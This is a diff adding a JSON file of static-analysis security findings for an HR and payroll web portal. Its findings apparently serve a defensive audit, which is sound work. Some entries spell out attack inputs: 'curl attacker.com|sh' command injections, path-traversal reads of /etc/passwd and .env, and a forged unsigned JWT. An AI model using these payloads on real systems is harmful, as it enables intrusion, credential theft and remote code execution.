@@ -1,0 +1,458 @@
+{
+  "version": "1.0.0",
+  "results": [
+    {
+      "check_id": "javascript.security.jwt.alg-none-accepted",
+      "path": "app/utils/allocationLinks.server.ts",
+      "start": {
+        "line": 19,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 24,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "resolveCostAllocationLink() calls jwt.verify() with algorithms: [\"HS256\", \"none\"]. Allowing the 'none' algorithm means any attacker can craft an unsigned JWT (header {\"alg\":\"none\"}, arbitrary payload, empty signature) and have it accepted as a valid, signed token. This function is used by the /allocation/snapshot route (app/routes/allocation.snapshot.tsx), which has NO session/role authentication of its own \u2014 it relies entirely on this token for authorization and exposes employee salary/bonus data for any department. An unauthenticated attacker can forge a token like base64url({\"alg\":\"none\",\"typ\":\"JWT\"}).base64url({\"departmentId\":\"<any-uuid>\",\"scope\":\"x\"}). to read any department's full compensation data.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-347: Improper Verification of Cryptographic Signature"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.client-controlled-approval-header",
+      "path": "app/routes/manager.approvals.tsx",
+      "start": {
+        "line": 210,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 238,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The 'connector_approve_task' action authorizes approving ANY onboarding task based solely on the client-supplied HTTP header x-workflow-connector-result, parsed via parseWorkflowConnectorResult (plain JSON.parse, no signature/HMAC) and checked with canAutoCompleteOnboardingTaskSafe(). Unlike the normal 'approve_task' path, this branch never verifies that the task's assignee reports to the current manager. Any authenticated manager can set the header to {\"access\":true,\"actorRole\":\"hr_admin\",\"actorId\":\"<own id>\"} (actorId only needs to equal their own currentUser.id, which they know) to approve any other manager's direct report's onboarding task, bypassing the management-chain authorization enforced elsewhere in this file.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization",
+            "CWE-290: Authentication Bypass by Spoofing"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.os-command-injection-pandoc",
+      "path": "app/utils/documentConversion.server.ts",
+      "start": {
+        "line": 10,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 14,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "convertDocumentFormat() builds a shell command via string interpolation, execSync(`pandoc ${sourcePath} -o ${outputPath} -t ${format}`), with no allowlist on `format`. It is called from app/routes/employee.documents.tsx:95 with format = url.searchParams.get(\"format\") ?? \"pdf\" \u2014 a query parameter fully controlled by any authenticated employee (requireUser only, no elevated role needed). A request such as POST /employee/documents?format=pdf;curl%20attacker.com|sh (or backticks/$() substitution) achieves arbitrary OS command execution as the server process.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: OS Command Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.os-command-injection-report-layout",
+      "path": "app/utils/reportRenderer.server.ts",
+      "start": {
+        "line": 26,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 28,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "renderReportWithLayout() runs `report-layout --in ${csvPath} --out ${outputPath} --preset ${layoutPreset}` via spawn(command, {shell:true}) with no validation of layoutPreset. It is called from app/routes/payroll.export.tsx:144 with reportLayout taken directly from formData.get(\"reportLayout\") for the 'payroll_report' export (payroll_specialist/hr_admin role). Because the value is posted as a raw form field (not restricted to the UI's dropdown), an attacker with that role can inject shell metacharacters (e.g. `standard; curl attacker.com|sh`) to execute arbitrary commands on the server.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: OS Command Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.header.clickjacking-header-bypass",
+      "path": "app/entry.server.tsx",
+      "start": {
+        "line": 16,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 25,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "applyPortalSecurityHeaders() strips X-Frame-Options and sets an invalid/no-op Content-Security-Policy (\"none\") for the ENTIRE application whenever the request carries the client-controlled header x-embed-context: benefits-partner (or when NODE_ENV isn't 'production'). Since this header is fully attacker-controlled and applied globally in the server entry (not scoped to a single embeddable route), any unauthenticated attacker can simply add `x-embed-context: benefits-partner` to disable clickjacking protection across the whole authenticated portal (login, dashboard, compensation-approval forms, etc.), enabling clickjacking attacks against logged-in users.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-1021: Improper Restriction of Rendering for Untrusted UI Layers"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.path-traversal-shared-drive",
+      "path": "app/utils/departmentSharedDrive.server.ts",
+      "start": {
+        "line": 11,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 14,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "listDepartmentSharedFiles() joins the caller-supplied `folder` directly onto SHARED_DRIVE_ROOT with no sanitization, then lists the resulting directory. It is called from app/routes/manager.team.tsx:160 with folder = formData.get(\"folder\") fully attacker-controlled (any manager/hr_admin). A value like `../../../../` lists arbitrary directories on the server filesystem outside the intended department-shared root. The sibling function listDepartmentSharedFilesSafe() (used correctly in admin.departments.tsx) applies path.basename() to prevent this, confirming the manager.team.tsx path is the unguarded one.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.path-traversal-attachment-upload",
+      "path": "app/utils/attachments.server.ts",
+      "start": {
+        "line": 12,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 23,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "storeRequestAttachment() joins the client-supplied File.name directly onto REQUEST_ATTACHMENTS_DIR without calling path.basename() or otherwise sanitizing it, then writes the uploaded content to that path. It is called from app/routes/employee.requests.tsx:176 with attachment.name \u2014 a value any authenticated employee fully controls via the multipart upload's filename field. A crafted filename such as `../../app/root.tsx` or `../../uploads/../../etc/cron.d/x` lets the attacher write the uploaded file outside the intended attachments directory. The sibling storeApprovalMemo() (used in manager.approvals.tsx) correctly applies path.basename(), confirming this is the unguarded twin.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.path-traversal-policy-template",
+      "path": "app/utils/policyTemplateLibrary.server.ts",
+      "start": {
+        "line": 11,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 14,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "loadPolicyStarterTemplate() joins the caller-supplied templateName directly onto TEMPLATE_LIBRARY_DIR and reads the file with no confinement check. It is called from app/routes/admin.policies.tsx:80 with templateName = formData.get(\"templateName\") \u2014 a raw form field an hr_admin can set to any value, not just the UI's fixed dropdown options. A value like `../../../../etc/passwd` or `../../.env` reads arbitrary files on the server and returns their contents to the client in the `template` field. The sibling loadPolicyStarterTemplateSafe() (used in manager.compensation.tsx) confines the resolved path to the template directory, confirming this is the unguarded twin.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.auth.unverified-jwt-decode-delegation",
+      "path": "app/utils/approvalDelegation.server.ts",
+      "start": {
+        "line": 19,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 21,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "readApprovalDelegation() uses jwt.decode() instead of jwt.verify(), so the delegation token's signature is never checked. It is used in app/routes/manager.approvals.tsx:76 (resolveOnboardingApprovalScope) to decide whose team's pending onboarding tasks and compensation requests (including salary/bonus figures) to show, driven by the `?delegation=` query parameter. Any authenticated manager can forge an arbitrary unsigned/self-signed JWT with {\"fromManagerId\":\"<victim manager id>\",\"toManagerId\":\"<own id>\"} to view another manager's team's sensitive pending-approval data without ever holding a real delegation grant. The sibling readVerifiedApprovalDelegation() (used for compensation sign-off in admin.employees.$id.tsx) correctly calls jwt.verify(), confirming this is the unguarded twin.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-347: Improper Verification of Cryptographic Signature"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.auth.session-token-leaked-via-get-query-string",
+      "path": "app/routes/payroll.export.tsx",
+      "start": {
+        "line": 63,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 66,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The 'sync_provider' action extracts the raw __session cookie value from the request and passes it to submitPayrollRecord(), which embeds it verbatim as an `api_key` query-string parameter on a plain GET request to the external payroll provider (app/utils/payrollProvider.server.ts:13-15: `fetch(`${PROVIDER_BASE_URL}/submit?employee_id=${employeeId}&amount=${amount}&api_key=${sessionToken}`)`). The user's live session-authentication cookie is thus sent as a URL query parameter to a third party, where it will typically be captured in server access logs, proxy logs, and browser/network history \u2014 letting anyone who can read those logs hijack the user's actual portal session.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-598: Use of GET Request Method With Sensitive Query Strings",
+            "CWE-522: Insufficiently Protected Credentials"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.type-confusion-actorid-comparison",
+      "path": "app/utils/workflowConnector.server.ts",
+      "start": {
+        "line": 28,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 38,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "canAutoCompleteOnboardingTaskSafe() compares actor identity with parseInt(result.actorId, 10) === parseInt(expectedActorId, 10), but actorId/expectedActorId are UUID strings (see users.id in app/db/schema.ts). parseInt on a UUID parses only the leading digit run before the first non-digit character (e.g. a hyphen or hex letter), so two completely different UUIDs that merely share the same leading digits compare as equal. Combined with manager.approvals.tsx's connector_approve_task trusting the fully client-supplied x-workflow-connector-result header, this weak comparison makes the 'safe' identity check bypassable by guessing/matching only the requester's own leading UUID digits rather than an actual cryptographic proof.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-697: Incorrect Comparison"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.unauthenticated-task-autocomplete",
+      "path": "app/routes/employee.tasks.tsx",
+      "start": {
+        "line": 104,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 126,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The 'connector_autocomplete' action authorizes approving the employee's own onboarding task based solely on the client-supplied x-workflow-connector-result HTTP header, parsed with a bare JSON.parse and no signature/HMAC verification (canAutoCompleteOnboardingTask uses loose `==` comparisons, see app/utils/workflowConnector.server.ts:18-23). Any employee can self-approve their own submitted-status-bypassing onboarding task by sending a forged header claiming actorRole \"hr_admin\" and an actorId matching (via parseInt truncation) their task's assignedById, bypassing the real manager-approval workflow.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization",
+            "CWE-290: Authentication Bypass by Spoofing"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.misconfig.cors-reflected-origin-with-credentials",
+      "path": "app/routes/partner.compensation-feed.tsx",
+      "start": {
+        "line": 18,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 24,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "attachCompensationFeedHeaders() reflects any Origin request header back as Access-Control-Allow-Origin and unconditionally sets Access-Control-Allow-Credentials: true, with no allowlist check. This permits any web origin to make credentialed cross-origin requests to this endpoint (which returns employee salary/effective-date data once the caller supplies x-partner-key). The sibling attachBenefitsFeedHeaders() in partner.benefits-feed.tsx correctly checks the Origin against a fixed allowlist before reflecting it, confirming this is the unguarded twin.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-942: Permissive Cross-domain Policy with Untrusted Domains"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.ldap-injection-directory-search",
+      "path": "app/utils/directoryService.server.ts",
+      "start": {
+        "line": 50,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 53,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "searchStaffDirectory() builds an LDAP-style filter by directly interpolating the caller-supplied `searchTerm` into `(|(cn=*${searchTerm}*)(mail=*${searchTerm}*))` with no escaping, unlike findUserByEmail() in the same file which properly escapes special characters via escapeLdapFilterValue() before building its filter. It is called from app/routes/manager.team.tsx:122 with directoryQuery = url.searchParams.get(\"directoryQuery\") \u2014 fully attacker-controlled. A value containing unescaped `*`, `(`, or `)` characters can alter the filter's logical structure (classic LDAP filter injection), and in a real ldapjs-backed implementation (which this module explicitly mimics) would allow bypassing the intended search scope or extracting unintended directory records.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-90: Improper Neutralization of Special Elements used in an LDAP Query ('LDAP Injection')"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.dos.uncontrolled-recursion-reporting-chain",
+      "path": "app/utils/orgChart.server.ts",
+      "start": {
+        "line": 15,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 33,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "expandReportingChain() walks the managerId chain with no depth limit or cycle detection, unlike the sibling expandReportingChainBounded() which caps traversal at MAX_CHAIN_DEPTH. It is called from app/routes/admin.employees.$id.tsx:158 whenever an hr_admin visits an employee detail page with `?view=chain`. Since hr_admin can freely edit any user's managerId via the 'update_profile' action (no cycle check there either), a manager-chain cycle (e.g. A manages B, B manages A) can be created and will cause this function to loop until the process runs out of memory/time \u2014 a denial-of-service reachable by a legitimate but careless hr_admin edit, or intentionally by a malicious hr_admin account.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-835: Loop with Unreachable Exit Condition ('Infinite Loop')"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.idor-mark-notification-read",
+      "path": "app/utils/notifications.server.ts",
+      "start": {
+        "line": 52,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 57,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "markAsRead() updates a notification by id with no check that it belongs to the requesting user. It is invoked from app/routes/notifications.tsx's 'mark_read' action with notificationId taken directly from form data, and requireUser() only confirms the caller is logged in, not that they own the notification. Any authenticated user can pass another user's notification id (e.g. by guessing/enumerating UUIDs observed elsewhere) and flip its isRead flag, an IDOR write.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-639: Authorization Bypass Through User-Controlled Key"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.mass-assignment-hris-sync",
+      "path": "app/utils/profileSync.server.ts",
+      "start": {
+        "line": 11,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 20,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "applyProfileSyncPayload() merges an arbitrary, caller-controlled JSON payload directly onto the full employee record with Object.assign({}, employee, parsed) and writes the merged object back with no field allowlist, unlike applyBenefitsProfileSync() in the same file which validates against a strict zod schema. It is called from app/routes/admin.employees.$id.tsx's 'sync_hris_profile' action with `payload` taken directly from a free-text textarea. This lets the caller overwrite any column on the users table \u2014 including passwordHash, resetToken, resetTokenExpiry, role, and disabled \u2014 via a single crafted JSON blob instead of the application's normal validated update paths.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.server-side-template-injection-handlebars",
+      "path": "app/utils/policyNotice.server.ts",
+      "start": {
+        "line": 7,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 13,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "renderPolicyAcknowledgementNotice() calls Handlebars.compile() on `policyContent` \u2014 free-text content authored by an hr_admin via the policy 'content' field (app/routes/admin.policies.tsx) \u2014 and executes it as a live template rather than treating it as plain text with simple variable substitution. It is invoked in app/routes/policies.tsx whenever any employee downloads their acknowledgement certificate (`?format=certificate`). Handlebars template expressions in the policy body (e.g. helper/lookup chains that reach constructor/prototype internals) are evaluated server-side, giving a compromised or malicious hr_admin account a path to server-side code execution via a normal policy-editing form rather than a hardened admin-only code path.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-94: Improper Control of Generation of Code ('Code Injection')"
+          ],
+          "confidence": "LOW",
+          "category": "security"
+        }
+      }
+    }
+  ]
+}
